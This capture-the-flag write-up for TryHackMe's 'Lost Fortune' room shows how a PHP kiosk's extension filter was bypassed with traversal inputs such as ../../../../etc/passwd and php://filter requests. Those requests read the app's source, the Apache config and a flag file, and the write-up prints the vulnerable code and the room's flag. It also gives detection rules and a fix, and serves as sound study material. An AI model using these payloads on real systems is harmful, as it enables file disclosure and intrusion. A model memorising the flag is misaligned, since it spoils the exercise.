# [Lost Fortune](https://tryhackme.com/room/thm-ctf-jackpot-overflow) - TryHackMe

**Room:** Lost Fortune | **Category:** Web | **Tags:** Web, OWASP, Black Box, Burp Suite

## Briefing

> The house always keeps a back room, and this one never quite closed its doors. Somewhere behind the neon and the noise sits a forgotten terminal, still quietly serving up files to anyone who knows how to ask nicely.

> Word on the floor is the old system trusts its visitors a little too much. Find the door, learn its language, and see what the dealer never meant to hand over.

## A quick note: APT vs. LFI

Before diving in, it's worth being precise about terminology. I initially conflated two completely different classification axes.

**Advanced Persistent Threat (APT)** describes a *threat actor* (refer to [CyberAttack notes](https://github.com/angeline-infosec/notes/blob/main/CyberAttacks/README.md)) - typically a well-resourced, often nation-state-affiliated group running long-term, stealthy campaigns against a target. It's a classification of *who* is attacking and *how* they operate (patience, stealth, specific objectives like espionage or sabotage), not a vulnerability or technique in itself.

**Local File Inclusion (LFI)** is a *vulnerability class* - a web application flaw where user-supplied input is used, insufficiently validated, to construct a filesystem path that the server then reads and returns. It's a subtype of **Path Traversal / Directory Traversal**, classified under **OWASP A01:2021 – Broken Access Control** and **CWE-22**.

The two sit on entirely different axes. One describes an attacker's sophistication and persistence. The other describes a specific class of coding flaw. An APT group might *use* an LFI vulnerability as part of a campaign, but the terms aren't interchangeable.

## Recon

Connected to the VPN and loaded the target in browser.

<img width="1900" height="891" alt="Screenshot 2026-10-19 122318" src="https://github.com/user-attachments/assets/26e3c9a9-4746-4e49-865a-4cd8d440708c" />


The kiosk, "Secret Village Archive Terminal" presents two documents and states its request format plainly:

```
Request format: ?doc=<filename>
Only .pdf and .png documents are served from this terminal.
```

This is a strong signal: a parameter directly referencing a filename, served by the backend. The expected behavior is a potential Local File Inclusion/path traversal vector before anything else.

Baseline test requesting the legitimate document to confirm expected behavior:

```
http://10.48.153.61/?doc=village_schedule.pdf
```

<img width="1917" height="937" alt="Screenshot 2026-10-19 122650" src="https://github.com/user-attachments/assets/fb8699de-baf6-45c1-9c4c-41d6c8c1164e" />

Confirmed. The PDF rendered normally. Also pulled `important.png` out of curiosity:

<img width="435" height="431" alt="Screenshot 2026-10-20 133451" src="https://github.com/user-attachments/assets/52451955-bde3-440e-a977-3be498fb3e3c" />


Just a meme (Mr. Robot "Hackerman" reaction image), likely a red herring rather than a clue, noted but not pursued further unless something later points back to it.

## Testing for path traversal

Attempted a basic traversal against the baseline:

```
http://10.48.153.61/?doc=../../../../etc/passwd
```

<img width="1916" height="848" alt="Screenshot 2026-10-19 124333" src="https://github.com/user-attachments/assets/c619a0a9-8b45-43fa-ba8d-7d20805880d6" />

This came back as a clean 403, with the message "Only .pdf and .png village documents may be viewed." So plain traversal characters were not being blocked outright. The request was reaching the application and getting rejected on something else, likely the extension check hinted at in the kiosk's footer text.

## Narrowing down the filter

To figure out what the filter was actually checking, I ran a few diagnostic tests rather than guessing blindly:

- `?doc=important.png.txt` downloaded a blank file instead of getting rejected with the pdf/png message. This told me the filter does a substring check (does `.pdf` or `.png` appear anywhere in the string) rather than a true suffix check (does the string end with `.pdf` or `.png`).
- `?doc=nonexistent.pdf` returned a blank PDF viewer page rather than the rejection message, confirming the same thing from a different angle, and giving me a baseline for what "passed the filter but file doesn't exist" looks like.
- A null byte attempt (`%00.png`) came back as a 500 Internal Server Error with an empty body. Checked in Burp Repeater to confirm this wasn't a browser encoding issue. This ruled out null byte truncation, which only worked on PHP versions before 5.3.4 anyway.
- A literal `#.png` suffix triggered a 400 Bad Request from Apache itself, since `#` is a reserved URL character I hadn't encoded. Not meaningful filter data, just a malformed request.
- A literal `?.png` suffix came back 200 OK with `Content-Disposition: filename="passwd?.png"`. The server tried to open a file literally named that, which doesn't exist, so the body was empty. Confirmed this wasn't a working bypass either, just another "passed the filter, file doesn't exist" case.

<img width="1188" height="608" alt="image" src="https://github.com/user-attachments/assets/1f747189-5ea8-455e-a4fb-4de7691bb76c" />

## Getting the source

Ran gobuster against the root to see what else was exposed:

```
gobuster dir -u http://10.48.153.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
```

Only `index.php` and `server-status` (403) came back. That told me the entire application logic lived in one file, which made reading its source the highest value next step.

Since the filter only checks for the substring `.pdf` or `.png` anywhere in the input, and PHP has stream wrappers like `php://filter` that let you reference a resource without using a normal file path at all, I tried combining the two:

```
curl http://10.48.153.61/?doc=php://filter/convert.base64-encode/resource=index.php | base64 -d
```

This worked and returned the full PHP source.

```
curl -s "http://10.48.153.61/?doc=php://filter/convert.base64-encode/resource=index.php" | base64 -d
<?php
$doc = isset($_GET['doc']) ? $_GET['doc'] : '';

$decoys = ['village_schedule.pdf', 'important.png'];

// If a doc param was sent, serve it (this is the vulnerable path)
if ($doc !== '') {

    // stage 1: naive single-pass traversal strip
    $doc = str_replace('../', '', $doc);

    $base = __DIR__ . '/village_docs/';
    $is_wrapper = (strpos($doc, '://') !== false);

    if (!$is_wrapper) {
        // stage 2: extension whitelist, only ever applied to plain filenames
        if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
            http_response_code(403);
            die('Only .pdf and .png village documents may be viewed.');
        }
        $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
    } else {
        // wrapper protocols were never covered by the whitelist check above
        $path = $doc;
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: inline; filename="' . basename($doc) . '"');
    readfile($path);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VILLAGE ARCHIVE TERMINAL v2.3</title>
<style>
    body {
        background-color: #060a0a;
        background-image:
            linear-gradient(rgba(45, 212, 191, 0.06) 1px, transparent 1px),
            linear-gradient(90deg, rgba(45, 212, 191, 0.06) 1px, transparent 1px);
        background-size: 28px 28px;
        color: #2dd4bf;
        font-family: 'Courier New', monospace;
        margin: 0;
        padding: 40px;
        min-height: 100vh;
    }
    .terminal {
        max-width: 720px;
        margin: 0 auto;
        background: rgba(6, 10, 10, 0.85);
        border: 1px solid #2dd4bf;
        border-radius: 2px;
        padding: 24px;
        box-shadow: 0 0 24px rgba(45, 212, 191, 0.12);
    }
    h1 {
        font-size: 20px;
        letter-spacing: 3px;
        text-transform: uppercase;
        border-bottom: 1px dotted #2dd4bf;
        padding-bottom: 10px;
        margin: 0 0 4px;
    }
    .tagline {
        font-size: 11px;
        letter-spacing: 2px;
        color: #0f766e;
        text-transform: uppercase;
        margin: 0 0 20px;
    }
    .prompt {
        color: #5eead4;
        margin-top: 20px;
        letter-spacing: 1px;
        font-size: 13px;
    }
    ul {
        list-style: none;
        padding: 0;
    }
    li {
        margin: 8px 0;
    }
    a {
        color: #2dd4bf;
        text-decoration: none;
        border: 1px dotted #115e59;
        padding: 6px 12px;
        display: inline-block;
        width: 260px;
        transition: background 0.15s, color 0.15s;
    }
    a:hover {
        background: #2dd4bf;
        color: #060a0a;
        border-color: #2dd4bf;
    }
    .footer {
        margin-top: 30px;
        font-size: 12px;
        color: #0f766e;
        border-top: 1px dotted #115e59;
        padding-top: 10px;
    }
    code {
        color: #5eead4;
    }
</style>
</head>
<body>
<div class="terminal">
    <h1>&gt; Secret Village Archive Terminal</h1>
    <p class="tagline">village kiosk // read-only access</p>
    <p>Welcome, attendee. This kiosk serves talk decks and vendor flyers for the village.</p>

    <div class="prompt">AVAILABLE DOCUMENTS:</div>
    <ul>
        <?php foreach ($decoys as $d): ?>
        <li><a href="?doc=<?php echo urlencode($d); ?>"><?php echo htmlspecialchars($d); ?></a></li>
        <?php endforeach; ?>
    </ul>

    <div class="footer">
        Request format: <code>?doc=&lt;filename&gt;</code><br>
        Only .pdf and .png documents are served from this terminal.
    </div>
</div>
</body>
</html>
```

## Exploitation

The source made the actual bug clear. The filter logic looked like this:

```php
$is_wrapper = (strpos($doc, '://') !== false);

if (!$is_wrapper) {
    if (stripos($doc, '.pdf') === false && stripos($doc, '.png') === false) {
        http_response_code(403);
        die('Only .pdf and .png village documents may be viewed.');
    }
    $path = (isset($doc[0]) && $doc[0] === '/') ? $doc : $base . $doc;
} else {
    $path = $doc;
}
```

The extension whitelist only runs when the input does not contain `://`. The moment it does, the app skips the whitelist entirely and skips restricting the path to the `village_docs/` folder, and just hands the raw string straight to `readfile()`. This is not really a traversal bug at all in the end. It is a missing validation branch for an entire class of input (any PHP stream wrapper), discovered because the substring check for `.pdf`/`.png` happened to match on `php://filter/read=pdf/...` without the developer realizing a stream wrapper URI could satisfy that same substring test.

With that confirmed, I went looking for the flag using the same technique, trying plausible paths:

```
curl http://10.48.153.61/?doc=php://filter/resource=/var/www/html/flag.txt
curl http://10.48.153.61/?doc=php://filter/resource=/var/www/html/village_docs/flag.txt
```

Both came back 200 OK with `Content-Length: 0`, meaning those exact paths did not exist. I confirmed the actual docroot by reading the Apache vhost config the same way:

```
curl http://10.48.153.61/?doc=php://filter/resource=/etc/apache2/sites-enabled/000-default.conf
```

This confirmed `DocumentRoot /var/www/html`, ruling out a wrong assumption about the path. The flag turned out to be sitting one directory above the docroot entirely:

```
curl http://10.48.153.61/?doc=php://filter/convert.base64-encode/resource=/var/www/flag.txt | base64 -d
```

<img width="910" height="308" alt="Screenshot 2026-10-19 144929" src="https://github.com/user-attachments/assets/49323f09-e93b-4c4a-8699-0308d64e29f6" />

## Flag

`THM{wr4pp3rs_sk1p_th3_wh1t3l1st}`

The flag text itself basically confirms the root cause: PHP stream wrappers skipped the whitelist entirely.

## What a defender would have seen

Flipping this to the blue team side for a moment, since this repo frames offensive work through a SOC lens too. The attack pattern here would be fairly loud in Apache access logs: a burst of requests to `?doc=` with repeated `../` sequences, then `%00`, then `php://filter/...` variants, all from one source IP in a short window. A few detection angles:

- A WAF rule or log alert on `php://`, `data://`, `expect://`, `zip://`, or any `://` substring inside a query parameter value would have caught this cold, since the app itself had no such check.
- Repeated 403 responses from the same IP against the same endpoint within a short time window is a classic brute-force/fuzzing signature, worth alerting on regardless of the specific payload.
- The underlying fix is straightforward: validate `$doc` against an allowlist of exact expected filenames (`village_schedule.pdf`, `important.png`) rather than trying to pattern-match safe input, and never pass user input directly into `readfile()` without first resolving and confirming the real path stays inside the intended directory (e.g. `realpath()` plus a prefix check).

## Takeaways

This room was a good reminder that an extension whitelist is only as strong as the code path that enforces it. The developer clearly thought "check for .pdf or .png anywhere in the string" was a reasonable filter, without accounting for the fact that PHP treats `://` as a completely different kind of input (a stream wrapper reference) rather than a plain filename, and that a wrapper URI can still contain the substring being checked for.

A few things I would do differently or carry forward:

- I spent a while guessing plausible flag filenames and paths one at a time (`flag.txt` in several directories) before stepping back and reading the actual source code and config files. Pulling the source early, once I realized `php://filter` worked at all, would have saved time versus guessing blind.
- A "file exists but is empty" response and a "file genuinely does not exist" response can look identical from the outside (both come back as empty bodies). Checking full headers (status code, `Content-Length`) rather than just the rendered page in browser made it much easier to tell these apart.
- The actual sensitive file was placed just outside the web root (`/var/www/flag.txt`, not inside `/var/www/html/`), which is a common CTF pattern worth trying early rather than only searching inside the docroot.
